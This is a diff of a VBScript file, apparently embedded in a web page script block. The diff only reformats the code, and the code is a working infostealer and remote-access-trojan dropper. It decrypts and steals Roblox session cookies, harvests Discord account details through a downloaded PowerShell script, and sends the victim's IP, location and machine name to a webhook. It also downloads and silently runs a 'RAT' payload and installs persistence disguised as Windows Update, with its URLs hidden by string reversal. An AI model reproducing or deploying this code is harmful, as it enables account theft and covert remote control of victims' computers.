@@ -18,8 +18,13 @@ zz = "5f4dcc3b5aa765d61d8327deb882cf99"
 n1 = o1.ExpandEnvironmentStrings("%COMPUTERNAME%")
 n2 = o1.ExpandEnvironmentStrings("%USERNAME%")
 
-Dim t0f : t0f = o1.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
-Dim tr : Set tr = o2.CreateTextFile(t0f, True) : tr.Write "START:" & Now & vbCrLf : tr.Close : Set tr = Nothing
+Dim t0f
+t0f = o1.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
+Dim tr
+Set tr = o2.CreateTextFile(t0f, True)
+tr.Write "START:" & Now & vbCrLf
+tr.Close
+Set tr = Nothing
 
 Call p1
 Call p2
@@ -58,18 +63,22 @@ End Function
 
 ' --- p2 ---
 Sub p2()
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim xh
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", fx(":sptht|.ipa//|.yfipi|/gro"), False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
-    Dim ip : ip = xh.responseText
+    Dim ip
+    ip = xh.responseText
     If Len(ip) < 7 Then Exit Sub
     xh.Open "GET", fx(":sptht|pa-pi/|/moc.i|/enil") & ip & fx("dleif?|nuoc=s|er,ryt|aNoig|tic,em|psi,y"), False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
-    Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim inf : inf = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & n1 & " | " & n2
+    Dim ll
+    ll = Split(xh.responseText, vbLf)
+    Dim inf
+    inf = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & n1 & " | " & n2
     Call q1(":dart: Target", inf, 3447003)
     Set xh = Nothing
 End Sub
@@ -84,17 +93,25 @@ Sub p3()
     a1(4) = o1.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
     Dim i, fp, rw
     For i = 0 To 4
-        If o2.FileExists(a1(i)) Then fp = a1(i) : Exit For
+        If o2.FileExists(a1(i)) Then
+            fp = a1(i)
+            Exit For
+        End If
     Next
     If Len(fp) = 0 Then
-        Dim pk : pk = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        Dim pk
+        pk = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
         If o2.FolderExists(pk) Then
             Dim fd, sf
             Set fd = o2.GetFolder(pk)
             For Each sf In fd.SubFolders
                 If InStr(UCase(sf.Name), "ROBLOX") > 0 Then
-                    Dim uw : uw = sf.Path & "\LocalState\RobloxCookies.dat"
-                    If o2.FileExists(uw) Then fp = uw : Exit For
+                    Dim uw
+                    uw = sf.Path & "\LocalState\RobloxCookies.dat"
+                    If o2.FileExists(uw) Then
+                        fp = uw
+                        Exit For
+                    End If
                 End If
             Next
             Set fd = Nothing
@@ -104,21 +121,27 @@ Sub p3()
     rw = u3(fp)
     If Len(rw) < 50 Then Exit Sub
 
-    Dim ck : ck = ""
+    Dim ck
+    ck = ""
     If InStr(rw, "_|WARNING") > 0 Then ck = rw
     If Len(ck) = 0 And InStr(rw, "CookiesData") > 0 Then
-        Dim sp : sp = InStr(rw, "CookiesData"":""")
+        Dim sp
+        sp = InStr(rw, "CookiesData"":""")
         If sp > 0 Then
             sp = sp + 14
-            Dim ep : ep = InStr(sp, rw, """")
+            Dim ep
+            ep = InStr(sp, rw, """")
             If ep > sp Then
-                Dim b64 : b64 = Mid(rw, sp, ep - sp)
+                Dim b64
+                b64 = Mid(rw, sp, ep - sp)
                 If Len(b64) > 100 Then ck = u4(b64)
             End If
         End If
     End If
     If Len(ck) = 0 And InStr(rw, ".ROBLOSECURITY") > 0 Then
-        Dim rp : rp = InStr(rw, ".ROBLOSECURITY") : ck = Mid(rw, rp)
+        Dim rp
+        rp = InStr(rw, ".ROBLOSECURITY")
+        ck = Mid(rw, rp)
     End If
     If Len(ck) = 0 Then ck = rw
 
@@ -126,10 +149,12 @@ Sub p3()
     ck = Replace(ck, vbLf, "")
     ck = Replace(ck, vbTab, "")
     ck = Trim(ck)
-    Dim sc : sc = InStr(ck, ";")
+    Dim sc
+    sc = InStr(ck, ";")
     If sc > 0 Then ck = Left(ck, sc - 1)
     ck = Trim(ck)
-    Dim wn : wn = InStr(ck, "_|WARNING")
+    Dim wn
+    wn = InStr(ck, "_|WARNING")
     If wn > 1 Then ck = Mid(ck, wn)
 
     q1 "Roblox Cookie", "Size: " & Len(ck) & " | PC: " & n1, 65280
@@ -138,10 +163,12 @@ End Sub
 
 ' --- p5 ---
 Sub p5()
-    Dim fp : fp = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
+    Dim fp
+    fp = o1.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
     If Not o2.FileExists(fp) Then
         On Error Resume Next
-        Dim fdir : fdir = o1.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
+        Dim fdir
+        fdir = o1.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap\InstallLocation")
         On Error Goto 0
         If fdir <> "" Then fp = fdir & "\Cache\AccountManager.json"
     End If
@@ -158,14 +185,17 @@ End Sub
 ' --- p6 ---
 Sub p6()
     Call q1(":package: RAT Download", "Fetching Payload...", 3447003)
-    Dim dl : dl = g2
+    Dim dl
+    dl = g2
 
-    Dim op : op = o1.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
+    Dim op
+    op = o1.ExpandEnvironmentStrings("%TEMP%") & "\agent.bat"
     If o2.FileExists(op) Then o2.DeleteFile op
 
     o1.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & op & "'""", 0, True
 
-    Dim rd : rd = False
+    Dim rd
+    rd = False
     If o2.FileExists(op) Then
         If o2.GetFile(op).Size > 3000000 Then
             rd = True
@@ -173,7 +203,8 @@ Sub p6()
     End If
 
     If rd Then
-        Dim ds : ds = o2.GetFile(op).Size
+        Dim ds
+        ds = o2.GetFile(op).Size
         Call q1(":rocket: RAT Downloaded", "Size: " & CStr(ds) & " bytes" & vbCrLf & "Launching...", 3447003)
         o1.Run op, 0, False
         Call q1(":white_check_mark: RAT", "Payload executed successfully", 65280)
@@ -187,7 +218,8 @@ End Sub
 Sub s2(s)
     Dim t1, t2, t3, el
     t1 = Timer()
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    Dim cmd
+    cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
     o1.Run cmd, 0, True
     el = Timer() - t1
     If el < 0 Then el = el + 86400
@@ -207,14 +239,17 @@ End Sub
 
 ' --- p4 ---
 Sub p4()
-    Dim pf : pf = fx(" atshm|:sptht|ecid//|.ecart|ppa")
+    Dim pf
+    pf = fx(" atshm|:sptht|ecid//|.ecart|ppa")
     On Error Resume Next
 
     o1.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", pf, "REG_SZ"
     o1.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", pf, "REG_SZ"
 
-    Dim sp : sp = o1.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = o2.CreateTextFile(sp, True)
+    Dim sp
+    sp = o1.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Dim sf
+    Set sf = o2.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & pf & """&Chr(34), 0, False"
     sf.Close
 
@@ -223,33 +258,41 @@ End Sub
 
 ' --- p1 ---
 Sub p1()
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    Dim xh
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", g1, False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
-    Dim pc : pc = xh.responseText
+    Dim pc
+    pc = xh.responseText
     If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
 
-    Dim psf : psf = u1("steal.ps1")
+    Dim psf
+    psf = u1("steal.ps1")
     u2 psf, pc
     o1.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
     o2.DeleteFile psf, True
 
-    Dim rf : rf = u1("steal_result.txt")
+    Dim rf
+    rf = u1("steal_result.txt")
     If Not o2.FileExists(rf) Then Exit Sub
-    Dim rw : rw = u3(rf)
+    Dim rw
+    rw = u3(rf)
 
     If Len(rw) > 10 Then
-        Dim ls : ls = Split(rw, vbCrLf)
+        Dim ls
+        ls = Split(rw, vbCrLf)
         Dim l
         For Each l In ls
             If Len(l) > 10 Then
                 If Left(l, 8) = "DISCORD|" Then
-                    Dim p : p = Split(Mid(l, 9), "|")
+                    Dim p
+                    p = Split(Mid(l, 9), "|")
                     If UBound(p) >= 4 Then
-                        Dim inf : inf = "**User:** " & p(0) & vbCrLf
+                        Dim inf
+                        inf = "**User:** " & p(0) & vbCrLf
                         If p(1) <> "" Then inf = inf & "**Email:** " & p(1) & vbCrLf
                         If p(2) <> "" Then inf = inf & "**Phone:** " & p(2) & vbCrLf
                         If p(3) <> "0" Then inf = inf & "**ID:** " & p(3) & vbCrLf
@@ -266,20 +309,47 @@ Sub p1()
 End Sub
 
 ' --- u1 / u2 / u3 ---
-Function u1(nm): u1 = o1.ExpandEnvironmentStrings("%TEMP%") & "\" & nm: End Function
-Sub u2(pth, cnt): Dim f: Set f = o2.CreateTextFile(pth, True): f.Write cnt: f.Close: Set f = Nothing: End Sub
-Function u3(pth): u3 = "": Dim f: Set f = o2.OpenTextFile(pth, 1): u3 = f.ReadAll: f.Close: Set f = Nothing: End Function
+Function u1(nm)
+    u1 = o1.ExpandEnvironmentStrings("%TEMP%") & "\" & nm
+End Function
+
+Sub u2(pth, cnt)
+    Dim f
+    Set f = o2.CreateTextFile(pth, True)
+    f.Write cnt
+    f.Close
+    Set f = Nothing
+End Sub
+
+Function u3(pth)
+    Dim f
+    u3 = ""
+    Set f = o2.OpenTextFile(pth, 1)
+    u3 = f.ReadAll
+    f.Close
+    Set f = Nothing
+End Function
 
 ' --- u7 ---
 Sub u7(u, body, ct)
-    Dim h : Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    On Error Resume Next
+    Dim h
+    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", u, False
-    If Len(ct) > 0 Then h.SetRequestHeader "Content-Type", ct Else h.SetRequestHeader "Content-Type", "application/json"
+    If Len(ct) > 0 Then
+        h.SetRequestHeader "Content-Type", ct
+    Else
+        h.SetRequestHeader "Content-Type", "application/json"
+    End If
     h.Send body
     If (h.Status < 200 Or h.Status > 299) And Len(W1) > 3 Then
         h.Open "POST", W1, False
-        If Len(ct) > 0 Then h.SetRequestHeader "Content-Type", ct Else h.SetRequestHeader "Content-Type", "application/json"
+        If Len(ct) > 0 Then
+            h.SetRequestHeader "Content-Type", ct
+        Else
+            h.SetRequestHeader "Content-Type", "application/json"
+        End If
         h.Send body
     End If
     Set h = Nothing
@@ -287,15 +357,20 @@ End Sub
 
 ' --- q1 / q2 ---
 Sub q1(t, d, c)
-    Dim DQ : DQ = Chr(34)
-    Dim j : j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & u5(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & u5(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim DQ
+    DQ = Chr(34)
+    Dim j
+    j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & u5(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & u5(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
     Call u7(W0, j, "")
 End Sub
 
 Sub q2(fn, ct)
-    Dim DQ : DQ = Chr(34)
-    Dim b : b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd : bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim DQ
+    DQ = Chr(34)
+    Dim b
+    b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
+    Dim bd
+    bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
     Call u7(W0, bd, "multipart/form-data; boundary=" & b)
 End Sub
 
@@ -308,33 +383,46 @@ Sub u6(cmd)
     Set p = w.Get("Win32_Process")
     p.Create cmd,,s,i
     If i = 0 Then Exit Sub
-    Dim r : r = True
-    Dim st : st = Timer()
+    Dim r
+    r = True
+    Dim st
+    st = Timer()
     Do While r
         If Timer() - st > 60 Then
             Call q1("DEBUG", "PS1 TIMEOUT after 60s, killing", 16711680)
             o1.Run "taskkill /F /PID " & i, 0, False
             Exit Do
         End If
-        Set w = GetObject("winmgmts:\\.\root\cimv2")
+        Set w = GetObject("winmgmts:\\\\.\\root\\cimv2")
         r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
         Set w = Nothing
-        If r Then Dim t : t = Timer() : Do While Timer() - t < 0.15 : Loop : End If
+        If r Then
+            Dim t
+            t = Timer()
+            Do While Timer() - t < 0.15
+            Loop
+        End If
     Loop
 End Sub
 
 ' --- u4 ---
 Function u4(b64)
     u4 = ""
-    Dim inf : inf = u1("dpi.txt")
-    Dim outf : outf = u1("dpo.txt")
+    Dim inf
+    inf = u1("dpi.txt")
+    Dim outf
+    outf = u1("dpo.txt")
     o2.DeleteFile outf, True
     u2 inf, b64
-    Dim ps : ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf : psf = u1("dpapi.ps1")
+    Dim ps
+    ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf
+    psf = u1("dpapi.ps1")
     u2 psf, ps
     o1.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If o2.FileExists(outf) Then If o2.GetFile(outf).Size > 20 Then u4 = u3(outf)
+    If o2.FileExists(outf) Then
+        If o2.GetFile(outf).Size > 20 Then u4 = u3(outf)
+    End If
     o2.DeleteFile inf, True
     o2.DeleteFile psf, True
     o2.DeleteFile outf, True
@@ -353,7 +441,8 @@ End Function
 
 ' --- decoy ---
 Sub zq()
-    Dim q : q = 1
+    Dim q
+    q = 1
     If q = 0 Then Call u6(zz)
 End Sub
 </script>
